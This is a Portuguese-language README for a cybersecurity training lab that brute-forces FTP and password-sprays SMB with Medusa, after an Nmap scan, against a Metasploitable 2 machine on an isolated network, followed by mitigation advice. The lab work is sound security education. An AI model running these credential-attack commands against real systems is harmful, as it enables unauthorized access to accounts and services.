# kali-cybersecurity-lab
# 🔐 Kali Linux Cybersecurity Lab

## 📌 Objetivo

Demonstrar ataques de força bruta em ambiente controlado utilizando Kali Linux e Medusa, com foco em identificação de vulnerabilidades e boas práticas de mitigação.

---

## 🖥️ Ambiente

* VirtualBox
* Kali Linux (máquina atacante)
* Metasploitable 2 (máquina vulnerável)
* Rede isolada (Host-Only)

---

## 🔎 Reconhecimento

Ferramenta: Nmap

Comando utilizado:

```
nmap -sV 192.168.56.102
```

Principais serviços identificados:

* FTP (porta 21)
* SMB (portas 139/445)
* HTTP (DVWA)

---

## 💣 Ataques Realizados

### 🔐 FTP (Força Bruta)

```
medusa -h 192.168.56.102 -u msfadmin -P wordlist.txt -M ftp
```

Resultado: credenciais válidas encontradas.

---

### 🌐 Web (DVWA)

Teste de múltiplas tentativas de login em aplicação vulnerável.

Resultado: ausência de bloqueio após tentativas inválidas.

---

### 🖥️ SMB (Password Spraying)

```
medusa -h 192.168.56.102 -U users.txt -p 123456 -M smbnt
```

Resultado: identificação de usuários com senhas fracas.

---

## 🛡️ Mitigações

* Utilizar senhas fortes
* Implementar bloqueio após tentativas falhas
* Adotar autenticação multifator (MFA)
* Monitorar acessos e logs


